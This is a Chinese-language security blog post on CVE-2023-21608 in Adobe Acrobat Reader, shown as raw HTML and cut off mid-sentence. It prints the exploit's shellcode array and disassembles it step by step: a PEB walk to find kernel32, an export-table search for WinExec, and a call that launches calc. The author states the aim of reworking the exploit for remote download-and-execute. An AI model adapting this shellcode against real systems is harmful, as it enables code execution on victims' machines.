<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    
    <title>CVE-2023-21608 | ioo0s&#39;s blog</title>

    <meta name="description" content="&lt;p&gt;Shellcode 分析&lt;/p&gt;
&lt;h2 id=&#34;目的&#34;&gt;&lt;a href=&#34;#目的&#34; class=&#34;headerlink&#34; title=&#34;目的&#34;&gt;&lt;/a&gt;目的&lt;/h2&gt;&lt;p&gt;为了改造该 exp 为远程命令执行，还需要对 shellcode 进行修改&lt;/p&gt;
&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a href=&#34;#前置知识&#34; class=&#34;headerlink&#34; title=&#34;前置知识&#34;&gt;&lt;/a&gt;前置知识&lt;/h3&gt;&lt;h2 id=&#34;PEB&#34;&gt;&lt;a href=&#34;#PEB&#34; class=&#34;headerlink&#34; title=&#34;PEB&#34;&gt;&lt;/a&gt;&lt;strong&gt;PEB&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;内容引用自 &lt;a href=&#34;https://xz.aliyun.com/t/10478&#34;&gt;x32 PEB: 获取 Kernel32 基地址的原理及实现 - 先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TEB&lt;/strong&gt;（Thread Environment Block，线程环境块）系统在此 TEB 中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。用户模式下，当前线程的 TEB 位于独立的 4KB 段(页)，可通过 CPU 的 FS 寄存器来访问该段，一般存储在[FS:0]&lt;/p&gt;">
    <meta name="keywords" content="">

    

    <meta property="og:locale" content="zh" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content= "CVE-2023-21608 | ioo0s&#39;s blog"  />
    <meta property="og:description" content= "&lt;p&gt;Shellcode 分析&lt;/p&gt;
&lt;h2 id=&#34;目的&#34;&gt;&lt;a href=&#34;#目的&#34; class=&#34;headerlink&#34; title=&#34;目的&#34;&gt;&lt;/a&gt;目的&lt;/h2&gt;&lt;p&gt;为了改造该 exp 为远程命令执行，还需要对 shellcode 进行修改&lt;/p&gt;
&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a href=&#34;#前置知识&#34; class=&#34;headerlink&#34; title=&#34;前置知识&#34;&gt;&lt;/a&gt;前置知识&lt;/h3&gt;&lt;h2 id=&#34;PEB&#34;&gt;&lt;a href=&#34;#PEB&#34; class=&#34;headerlink&#34; title=&#34;PEB&#34;&gt;&lt;/a&gt;&lt;strong&gt;PEB&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;内容引用自 &lt;a href=&#34;https://xz.aliyun.com/t/10478&#34;&gt;x32 PEB: 获取 Kernel32 基地址的原理及实现 - 先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TEB&lt;/strong&gt;（Thread Environment Block，线程环境块）系统在此 TEB 中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。用户模式下，当前线程的 TEB 位于独立的 4KB 段(页)，可通过 CPU 的 FS 寄存器来访问该段，一般存储在[FS:0]&lt;/p&gt;" />
    <meta property="og:url" content="http://ioo0s.art/2023/03/15/CVE-2023-21608/index.html" />
    <meta property="og:site_name" content="" />
    <meta property="article:author" content="ios" />
    <meta property="article:publisher" content="" />
    <meta property="og:description" content="&lt;p&gt;Shellcode 分析&lt;/p&gt;
&lt;h2 id=&#34;目的&#34;&gt;&lt;a href=&#34;#目的&#34; class=&#34;headerlink&#34; title=&#34;目的&#34;&gt;&lt;/a&gt;目的&lt;/h2&gt;&lt;p&gt;为了改造该 exp 为远程命令执行，还需要对 shellcode 进行修改&lt;/p&gt;
&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a href=&#34;#前置知识&#34; class=&#34;headerlink&#34; title=&#34;前置知识&#34;&gt;&lt;/a&gt;前置知识&lt;/h3&gt;&lt;h2 id=&#34;PEB&#34;&gt;&lt;a href=&#34;#PEB&#34; class=&#34;headerlink&#34; title=&#34;PEB&#34;&gt;&lt;/a&gt;&lt;strong&gt;PEB&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;内容引用自 &lt;a href=&#34;https://xz.aliyun.com/t/10478&#34;&gt;x32 PEB: 获取 Kernel32 基地址的原理及实现 - 先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TEB&lt;/strong&gt;（Thread Environment Block，线程环境块）系统在此 TEB 中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。用户模式下，当前线程的 TEB 位于独立的 4KB 段(页)，可通过 CPU 的 FS 寄存器来访问该段，一般存储在[FS:0]&lt;/p&gt;" />
    <meta name="twitter:title" content="CVE-2023-21608 | ioo0s&#39;s blog"/>
    <meta name="twitter:description" content="&lt;p&gt;Shellcode 分析&lt;/p&gt;
&lt;h2 id=&#34;目的&#34;&gt;&lt;a href=&#34;#目的&#34; class=&#34;headerlink&#34; title=&#34;目的&#34;&gt;&lt;/a&gt;目的&lt;/h2&gt;&lt;p&gt;为了改造该 exp 为远程命令执行，还需要对 shellcode 进行修改&lt;/p&gt;
&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a href=&#34;#前置知识&#34; class=&#34;headerlink&#34; title=&#34;前置知识&#34;&gt;&lt;/a&gt;前置知识&lt;/h3&gt;&lt;h2 id=&#34;PEB&#34;&gt;&lt;a href=&#34;#PEB&#34; class=&#34;headerlink&#34; title=&#34;PEB&#34;&gt;&lt;/a&gt;&lt;strong&gt;PEB&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;内容引用自 &lt;a href=&#34;https://xz.aliyun.com/t/10478&#34;&gt;x32 PEB: 获取 Kernel32 基地址的原理及实现 - 先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TEB&lt;/strong&gt;（Thread Environment Block，线程环境块）系统在此 TEB 中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。用户模式下，当前线程的 TEB 位于独立的 4KB 段(页)，可通过 CPU 的 FS 寄存器来访问该段，一般存储在[FS:0]&lt;/p&gt;"/>
    <script type="application/ld+json">
        {
            "description": "&lt;p&gt;Shellcode 分析&lt;/p&gt;
&lt;h2 id=&#34;目的&#34;&gt;&lt;a href=&#34;#目的&#34; class=&#34;headerlink&#34; title=&#34;目的&#34;&gt;&lt;/a&gt;目的&lt;/h2&gt;&lt;p&gt;为了改造该 exp 为远程命令执行，还需要对 shellcode 进行修改&lt;/p&gt;
&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a href=&#34;#前置知识&#34; class=&#34;headerlink&#34; title=&#34;前置知识&#34;&gt;&lt;/a&gt;前置知识&lt;/h3&gt;&lt;h2 id=&#34;PEB&#34;&gt;&lt;a href=&#34;#PEB&#34; class=&#34;headerlink&#34; title=&#34;PEB&#34;&gt;&lt;/a&gt;&lt;strong&gt;PEB&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;内容引用自 &lt;a href=&#34;https://xz.aliyun.com/t/10478&#34;&gt;x32 PEB: 获取 Kernel32 基地址的原理及实现 - 先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TEB&lt;/strong&gt;（Thread Environment Block，线程环境块）系统在此 TEB 中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。用户模式下，当前线程的 TEB 位于独立的 4KB 段(页)，可通过 CPU 的 FS 寄存器来访问该段，一般存储在[FS:0]&lt;/p&gt;",
            "author": { "@type": "Person", "name": "ios" },
            "@type": "BlogPosting",
            "url": "http://ioo0s.art/2023/03/15/CVE-2023-21608/index.html",
            "publisher": {
            "@type": "Organization",
            "logo": {
                "@type": "ImageObject",
                "url": "http://ioo0s.art/images/avatar.jpg"
            },
            "name": "ios"
            },
            "headline": "CVE-2023-21608 | ioo0s&#39;s blog",
            "datePublished": "2023-03-15T01:07:17.000Z",
            "mainEntityOfPage": {
                "@type": "WebPage",
                "@id": "http://ioo0s.art/2023/03/15/CVE-2023-21608/index.html"
            },
            "@context": "http://schema.org"
        }
    </script>




    

    

    

    

    
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🦈</text></svg>">
    

    

    

    
<link rel="stylesheet" href="/dist/build.css?v=1654266144177.css">


    
<link rel="stylesheet" href="/dist/custom.css?v=1654266144177.css">


    <script>
        window.isPost = true
        window.aomori = {
            
            
            
        }
        window.aomori_logo_typed_animated = true
        window.aomori_search_algolia = false

    </script>

<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ioo0s's blog" type="application/atom+xml">
</head>

<body>

    <div class="container">
    <header class="header">
        <div class="header-type">
            
            <div class="header-type-avatar avatar avatar-sm">
                <img src="/images/avatar.jpg" alt="ios">
            </div>
            
            <div class="header-type-inner">
                
                    <div id="typed-strings" style="display:none">
                        <p>ioo0s&#39;s blog</p>
                    </div>
                    <a class="header-type-title" id="typed" href="/"></a>
                
    
                
            </div>
        </div>
        <div class="header-menu">
            <div class="header-menu-inner">
                
                <a href="/">主页</a>
                
                <a href="/archives">存档</a>
                
                <a href="/collection">收藏</a>
                
                <a href="/about">关于</a>
                
            </div>
            <div class="header-menu-social">
                
    <a class="social" target="_blank" href="https://github.com/ioo0s">
        <ion-icon name="logo-github"></ion-icon>
    </a>

    <a class="social" target="_blank" href="https://twitter.com/LiuIos">
        <ion-icon name="logo-twitter"></ion-icon>
    </a>

    <a class="social" target="_blank" href="http://ioo0s.art/atom.xml">
        <ion-icon name="logo-rss"></ion-icon>
    </a>

            </div>
        </div>

        <div class="header-menu-mobile">
            <div class="header-menu-mobile-inner" id="mobile-menu-open">
                <i class="icon icon-menu"></i>
            </div>
        </div>
    </header>

    <div class="header-menu-mobile-menu">
        <div class="header-menu-mobile-menu-bg"></div>
        <div class="header-menu-mobile-menu-wrap">
            <div class="header-menu-mobile-menu-inner">
                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
                    <i class="icon icon-cross"></i>
                </div>
                <div class="header-menu-mobile-menu-list">
                    
                    <a href="/">主页</a>
                    
                    <a href="/archives">存档</a>
                    
                    <a href="/collection">收藏</a>
                    
                    <a href="/about">关于</a>
                    
                </div>
            </div>
        </div>
    </div>

</div>

    <div class="container">
        <div class="main">
            <section class="inner">
                <section class="inner-main">
                    <div class="post">
    <article id="post-clgkomm2l0001381w8pncb7s7" class="article article-type-post" itemscope
    itemprop="blogPost">

    <div class="article-inner">

        
          
        
        
        

        
        <header class="article-header">
            
  
    <h1 class="article-title" itemprop="name">
      CVE-2023-21608
    </h1>
  

        </header>
        

        <div class="article-more-info article-more-info-post hairline">

            <div class="article-date">
  <time datetime="2023-03-15T01:07:17.000Z" itemprop="datePublished">2023-03-15</time>
</div>

            
            <div class="article-category">
                <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
            </div>
            

            
            <div class="article-tag">
                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Acrobat-Reader/" rel="tag">Acrobat Reader</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Adobe/" rel="tag">Adobe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
            </div>
            

            
            <div class="article-busuanzi">
                <span id="busuanzi_value_page_pv">N</span> 人看过
            </div>
            

        </div>

        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
            <p>Shellcode 分析</p>
<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>为了改造该 exp 为远程命令执行，还需要对 shellcode 进行修改</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h2 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a><strong>PEB</strong></h2><p>内容引用自 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10478">x32 PEB: 获取 Kernel32 基地址的原理及实现 - 先知社区</a></p>
<p><strong>TEB</strong>（Thread Environment Block，线程环境块）系统在此 TEB 中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。用户模式下，当前线程的 TEB 位于独立的 4KB 段(页)，可通过 CPU 的 FS 寄存器来访问该段，一般存储在[FS:0]</p>
<span id="more"></span>

<p><strong>PEB</strong>（Process Environment Block，进程环境块）存放进程信息，每个进程都有自己的 PEB 信息。位于用户地址空间。可在 TEB 结构地址偏移 0x30 处获得 PEB 的地址位置。</p>
<pre><code>typedef struct _PEB &#123;
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
&#125; PEB, *PPEB;
</code></pre>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><pre><code>var shellcode = [
    // recovery prefix       (store reg context)
    // 0x909090CC,
    0x89e083e8, 0x18535256, 0x57505590,

    // shellcode
    835867240, 1667329123, 1415139921, 1686860336, 2339769483, 1980542347, 814448152, 2338274443,
    1545566347, 1948196865, 4270543903, 605009708, 390218413, 2168194903, 1768834421, 4035671071,
    469892611, 1018101719, 2425393296,

    // recovery suffix
    // 0x909090CC,
    /*restore regs*/ 0x58585d58, /*restore vtable*/ 0x8b48608b, 0x50648911, /*pop regs*/ 0x5f5e5a5b,
    /*restore ebp,esp: 0x89ea83ea, 0x3089d490, */ 0x89ec83ec, 0x30909090, /* esi = fn*/ 0x8b706890,
    /*arrbuf restore*/ 0x53bb4000, 0x00208b50, 0x6cc7430c, 0xe8ff0000, 0xc74220e8, 0xff000090,
    0x8953108b, 0x50708913, 0x8b507489, 0x530431d2, 0x5b909090, /*jmp esi*/ 0xffe69090
    /*jmp defaultVal 0xff606890*/
];
</code></pre>
<p>通过验证可以得知该 shellcode 的作用是弹出计算机，但我们的最终目的是为了远程下载并执行文件。</p>
<p>shellcode 部分</p>
<pre><code>835867240, 1667329123, 1415139921, 1686860336, 2339769483, 1980542347, 814448152, 2338274443,
    1545566347, 1948196865, 4270543903, 605009708, 390218413, 2168194903, 1768834421, 4035671071,
    469892611, 1018101719, 2425393296
</code></pre>
<p>都是 10 进制字符串，尝试简单转 16 进制看看</p>
<pre><code>shellcode = [835867240, 1667329123, 1415139921, 1686860336, 2339769483, 1980542347, 814448152, 2338274443,
    1545566347, 1948196865, 4270543903, 605009708, 390218413, 2168194903, 1768834421, 4035671071,
    469892611, 1018101719, 2425393296]

for shell_bytes in shellcode:
    print(hex(shell_bytes))
</code></pre>
<p>执行结果，所以先转 16 进制没问题</p>
<pre><code>0x31d25268
0x63616c63 # calc 的ascii
0x54595251
0x648b7230
0x8b760c8b
0x760cad8b
0x308b7e18
0x8b5f3c8b
0x5c1f788b
0x741f2001
0xfe8b541f
0x240fb72c
0x174242ad
0x813c0757
0x696e4575
0xf08b741f
0x1c01fe03
0x3caeffd7
0x90909090 # nop
</code></pre>
<p>其中最后一行的 <code>0x90909090</code> 特征比较明显，是 x86 汇编中的 <code>nop</code>，主要作用是对齐栈。</p>
<p>第二步，将片段 16 进制代码转汇编</p>
<h3 id="获取-kernel32-dll-基地址"><a href="#获取-kernel32-dll-基地址" class="headerlink" title="获取 kernel32.dll 基地址"></a>获取 kernel32.dll 基地址</h3><p>此段 shellcode 主要用于获取 kernel32.dll 的基地址，该部分的理解参考了该文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10478#toc-0">x32 PEB: 获取 Kernel32 基地址的原理及实现 - 先知社区</a>。</p>
<ol>
<li>0x31d25268</li>
</ol>
<pre><code>Array Literal:
&#123; 0x31, 0xD2, 0x52, 0x68 &#125;
Disassembly:
0:  31 d2                   xor    edx,edx
2:  52                      push   edx
3:  68                      .byte 0x68
</code></pre>
<ol start="2">
<li>0x63616c63</li>
</ol>
<p>由于第一段多了个 68，所以补在这一段</p>
<p>将 <code>calc</code> 字符串压栈</p>
<pre><code>Array Literal:
&#123; 0x68, 0x63, 0x61, 0x6C, 0x63 &#125;
Disassembly:
0:  68 63 61 6c 63          push   0x636c6163 # 存字符串
</code></pre>
<ol start="3">
<li>0x54595251</li>
</ol>
<pre><code>Array Literal:
&#123; 0x54, 0x59, 0x52, 0x51 &#125;
Disassembly:
0:  54                      push   esp #压入字符串所在地址
1:  59                      pop    ecx # 将字符串所在地址复制给ecx
2:  52                      push   edx # 压入edx
3:  51                      push   ecx #压入ecx
</code></pre>
<p>执行到 pop ecx 时的内存情况，ecx 指向 calc 的所在地址</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnEPdCsCBmg4HIJ4Cq0uPeAg.png"></p>
<ol start="4">
<li>0x648b7230</li>
</ol>
<pre><code>Array Literal:
&#123; 0x64, 0x8B, 0x72, 0x30 &#125;
Disassembly:
0:  64 8b 72 30             mov    esi,DWORD PTR fs:[edx+0x30]
</code></pre>
<p>edx 此时为 0 ，获取 fs 段 +0x30 处地址放入 esi，下图为执行后的 ESI 结果 <code>FF4F4000</code></p>
<p>在 TEB 结构地址偏移 0x30 处获得 PEB 的地址位置</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcn87FydCapWYkXl6yIkuQosh.png"></p>
<ol start="5">
<li>0x8b760c8b</li>
</ol>
<pre><code>Array Literal:
&#123; 0x8B, 0x76, 0x0C, 0x8B &#125;
Disassembly:
0:  8b 76 0c                mov    esi,DWORD PTR [esi+0xc]
3:  8b                      .byte 0x8b
</code></pre>
<p>多出的 8b 放入下一层反编译</p>
<p>执行该条命令前 esi 指向 fs+0x30 处，接着再将 esi+0xc 取值到 esi ,从下图可以看到此时 esi 变成了 ntdll 所在地址，</p>
<p>本次操作主要目的为获取指向 <code>PEB-&gt;PEB_LDR_DATA</code> 的指针</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnF7FLiTQJLKQj1vTeNQ7yDg.png"></p>
<ol start="6">
<li>0x760cad8b</li>
</ol>
<pre><code>Array Literal:
&#123; 0x8B, 0x76, 0x0C, 0xAD, 0x8B &#125;
Disassembly:
0:  8b 76 0c                mov    esi,DWORD PTR [esi+0xc]
3:  ad                      lods   eax,DWORD PTR ds:[esi]
4:  8b                      .byte 0x8b
</code></pre>
<p>反汇编时要拼接上一轮没有被反编译的 0xb8，看到是再次对 esi+0xc 并取该处的值 得到一个程序内的地址，该地址指向 <code>PEB-&gt;PEB_LDR_DATA-&gt;InLoadOrderModuleList</code> 的 Flink 字段</p>
<p>图片引用自 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10478">https://xz.aliyun.com/t/10478</a></p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnF4iijWBxxjcwGxrhM0j0T7.png"></p>
<p>lodsd 后 指向 Flink 从第 0 个改为指向第 3 个</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnLpZPnA54EMFFFfvEJyGuAd.png"></p>
<p>查看该地址处 <code>0x52326F8</code> 反汇编代码，</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnsGw5Pb4zmv44Zbu3V3ghNb.png"></p>
<ol start="7">
<li>0x308b7e18</li>
</ol>
<pre><code>Array Literal:
&#123; 0x8B, 0x30, 0x8B, 0x7E, 0x18 &#125;
Disassembly:
0:  8b 30                   mov    esi,DWORD PTR [eax]
2:  8b 7e 18                mov    edi,DWORD PTR [esi+0x18]
</code></pre>
<p>同上一轮，拼接剩下的 0x8b，并反汇编，在执行该地址前，执行了一次 lodsd</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnTcJ4ihcBu7UhT7c8UoM7Av.png"></p>
<p>发现 EAX 的值改为了 <code>0x5232618</code> ，也就是此时取地址内容的真实地址是 <code>0x5232618</code> 而不是 <code>0x20000358</code></p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnuTjjJnj2ps5oBkTjwC6NMh.png"></p>
<p>执行后 esi 指向 <code>0x52328d8</code>,此时 ESI 所在结构为 <code>PEB_LDR_DATA-&gt;InLoadOrderModuleList[2]</code> ,查看此处反汇编及内存中内容 ，通过先知文章可以知道此时的结构信息，esi 指向 INLoadOrderLinks 的地址，距离我们的 DLLBase 还差 0x18</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnvuasw6g0HaPJkPQ3grfHFg.png"></p>
<p>继续运行</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnreqyoZ4SLtlTHLss5UpaOh.png"></p>
<p>接着下一次执行复制到 edi，地址从当前的 esi+0x18 处获取内容，如下图，地址内容为 <code>77260000</code> ,该内容为地址，指向 kernel32.dll，也就是获取到了 DLLBASE 地址。后续均称为 <code>kernel_addr</code>。</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnf6ARqo2F7mmO3hWyGp593e.png"></p>
<h3 id="动态获得函数地址"><a href="#动态获得函数地址" class="headerlink" title="动态获得函数地址"></a>动态获得函数地址</h3><p>该部分后续 shellcode 主要用来定位具体的某个函数，通过 kernel_addr + 搜索偏移 得到具体的函数地址。该部分主要参考 <a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/q-buffer-overflow-tutorial/content/119.html">wizardforcel.gitbooks.io</a></p>
<ol start="8">
<li>0x8b5f3c8b</li>
</ol>
<pre><code>Array Literal:
&#123; 0x8B, 0x5F, 0x3C, 0x8B &#125;
Disassembly:
0:  8b 5f 3c                mov    ebx,DWORD PTR [edi+0x3c]
3:  8b                      .byte 0x8b
</code></pre>
<p>此部分主要用于获取 PE 头部偏移，对 ebx 赋值 edi+0x3c，注意此时 edi 指向 kernel32.dll 基地址，也就是获取 kernel_addr+0x3c 处的内容，得到 EBX=0xF8,所以 PE_HEADER_OFFSET = 0xF8。</p>
<p>PE 头部偏移在 kerner32.dll 基址 ＋0x3C 的地方。</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnahbPrPN2Ne9a450cwTthJe.png"></p>
<ol start="9">
<li>0x5c1f788b</li>
</ol>
<pre><code>Array Literal:
&#123; 0x8B, 0x5C, 0x1F, 0x78, 0x8B &#125;
Disassembly:
0:  8b 5c 1f 78             mov    ebx,DWORD PTR [edi+ebx*1+0x78]
4:  8b                      .byte 0x8b
</code></pre>
<p>输出表的位置在 kerner32.dll 基地址 +PE 头部地址 +0x78，所以此处 ebx 的内容是输出表的地址。</p>
<p>输出表结构如下，对于我们的目的是为了找函数，则可以通过匹配函数名字然后确定函数地址。</p>
<pre><code>Typedef struct _IMAGE_EXPORT_DIRECTORY
&#123;
    Characteristics; 4
    TimeDateStamp 4
    MajorVersion 2
　　MinorVersion 2
　　Name 4 模块名字
　　Base 4 基数，加上序数就是函数地址数组的索引值
　　NumberOfFunctions 4
    NumberOfNames 4
    AddressOfFunctions 4 指向函数地址数组
　　AddressOfNames 4 函数名字的指针地址
　　AddressOfNameOrdinal 4 指向输出序列号数组
&#125;
</code></pre>
<p>在(kernel32 基址 +export+0x1c +offset)处获取 AddressOfFunctions、AddressOfNames、AddressOfNameOrdinalse。</p>
<p>(kernel32 基址 +export+0x1C) AddressOfFunctions</p>
<p>(kernel32 基址 +export+0x20) AddressOfNames</p>
<p>(kernel32 基址 +export+0x24) AddressOfNameOrdinal</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnvmj7BFvKQxEQDKuGFdCARh.png"></p>
<ol start="10">
<li>0x741f2001</li>
</ol>
<pre><code>Array Literal:
&#123; 0x8B, 0x74, 0x1F, 0x20, 0x01 &#125;
Disassembly:
0:  8b 74 1f 20             mov    esi,DWORD PTR [edi+ebx*1+0x20]
4:  01                      .byte 0x1
</code></pre>
<p>esi 指向 AddressOfNames ，主要存储函数名称指针地址偏移</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcn0AZkcUKqNedlHepJHbWGJf.png"></p>
<ol start="11">
<li>0xfe8b541f</li>
</ol>
<p>两次汇编 第一次补齐上轮 +1 字节</p>
<pre><code>Array Literal:
&#123; 0x01, 0xFE &#125;
Disassembly:
0:  01 fe                   add    esi,edi
</code></pre>
<p>计算出 函数名地址，edi 为 kernel32 基地址 + 刚刚获取的 AddressOfName 的偏移地址 = AddressOfName 所在地址</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnlrO3nUsdoBAOvLuuXaFBnf.png"></p>
<p>第二次 补齐下轮 1 字节</p>
<pre><code>Array Literal:
&#123; 0x8B, 0x54, 0x1F, 0x24 &#125;
Disassembly:
0:  8b 54 1f 24             mov    edx,DWORD PTR [edi+ebx*1+0x24]
</code></pre>
<p>EDX 内容存储了(kernel32 基址 +export+0x24) <code>AddressOfNameOrdinal</code> 结构的偏移地址，该结构用于存放函数的序号，构成一个函数序号数组</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcntlc16TRHBNzWVgpEVpy12g.png"></p>
<ol start="12">
<li>循环部分统一反汇编</li>
</ol>
<p>这里要注意 jne 跳转到 0 地址 这个是相对地址，当在内存中时，指向 <code>movzx  ebp,WORD PTR [edi+edx*1]</code> 指令所在地址</p>
<pre><code>0:  0f b7 2c 17             movzx  ebp,WORD PTR [edi+edx*1]
4:  42                      inc    edx
5:  42                      inc    edx
6:  ad                      lods   eax,DWORD PTR ds:[esi]
7:  81 3c 07 57 69 6e 45    cmp    DWORD PTR [edi+eax*1],0x456e6957
e:  75 f0                   jne    0x0
</code></pre>
<p>ebp = edi+edx = kernel32 基地址 +AddressOfNameOrdinal 地址偏移 = <code>AddressOfNameOrdinal</code> 结构真实地址</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnDLoYmfXhkUTDAzTSCoE0Od.png"></p>
<p>更新 edx，注意此时 edx 存的 <code>AddressOfNameOrdinal</code> 数组[0]位置的偏移地址，inc edx 后会将数组移动到下一位</p>
<p>将 edx 指向 <code>AddressOfNameOrdinal</code> 数组[1] 位置的偏移地址。</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcn614EYC1VDHAWF7mQBKpufN.png"></p>
<p>LODSD 指令从 ESI 指向的内存地址加载一个字到 EAX，得到一个新的 EAX 偏移</p>
<p>此时 ESI 存储为(kernel32 基址 +export+0x20) AddressOfNames 数组[0]指针的真实地址，所以通过 lodsd 指令可以获取 AddressOfNames 数组[0]处内容并放在 EAX，此时 EAX 为 函数名称数组[0]-&gt; 函数名称偏移地址</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnEqT77UIUU8gvBGWbISDm2b.png"></p>
<p>通过计算 edi +eax = kernel32 基地址 + 函数名称偏移地址 = 真实函数名称地址，取该地址内容 也就是函数名称 与 <code>WinE</code> 比较，如果不相等则进行循环重新得到一个新的 ebp（<code>AddressOfNameOrdinal[1]</code> 对应序号的真实地址），接着再次将 edx+2 后得到 <code>AddressOfNames[1]</code> 的函数名称地址的指针地址偏移，最后再次计算函数名称地址的真实地址，再次与 WinE 比较 循环。</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnOnAs7EuU7ZttKWFxpa6vNh.png"></p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcn3RMOVtL7C5M3swxS5l6cih.png"></p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcn8qrLc9XxMCBbYrHY0whILc.png"></p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnWsiKIi2FOg0qafV3B2X7sh.png"></p>
<p>最终找到 WinExec 时结束循环，此时 EAX 偏移地址为 WinExec 函数名称的地址偏移，EBP 为该函数的序号地址。</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnEZqUhNHshjPNBRsBfBnIsf.png"></p>
<ol start="13">
<li>最终段 反汇编</li>
</ol>
<pre><code>Array Literal:
&#123; 0x8B, 0x74, 0x1F, 0x1C, 0x01, 0xFE, 0x03, 0x3C, 0xAE, 0xFF, 0xD7 &#125;
Disassembly:
0:  8b 74 1f 1c             mov    esi,DWORD PTR [edi+ebx*1+0x1c]
4:  01 fe                   add    esi,edi
6:  03 3c ae                add    edi,DWORD PTR [esi+ebp*4]
9:  ff d7                   call   edi
</code></pre>
<p>ESI = (kernel32 基址 +export 真实地址 +0x1C) AddressOfFunctions [0]的偏移地址</p>
<p>Add esi,edi 计算出 AddressOfFunctions [0]的真实地址</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnbbwRN3v5UizyPM83JMMdSD.png"></p>
<p>此时 EBP 为 WinExec 函数的 序号地址，ESI 为 AddressOfFunctions 偏移地址</p>
<p><code>esi+ebp*4 </code> 得到 WinExec 函数的偏移地址</p>
<p><code>add    edi,DWORD PTR [esi+ebp*4] </code> 相加得到 WinExec 函数的真实地址</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnD4mQNoBRzYXCJVld9ODTuN.png"></p>
<p>在执行这段 shellcode 的同时没有再对栈空间做任何操作，栈空间包含两个参数，参数 1.calc 所在地址 2.0</p>
<p>最终 call edi 触发 kernel32.WinExec(“calc”，0)</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcn2bY2wNOHPbhgV4NA9BOy5g.png"></p>
<p>通过查询可知，WinExec 刚好有两个参数，参数一：命令 ，参数二：内容显示</p>
<pre><code>UINT WinExec(
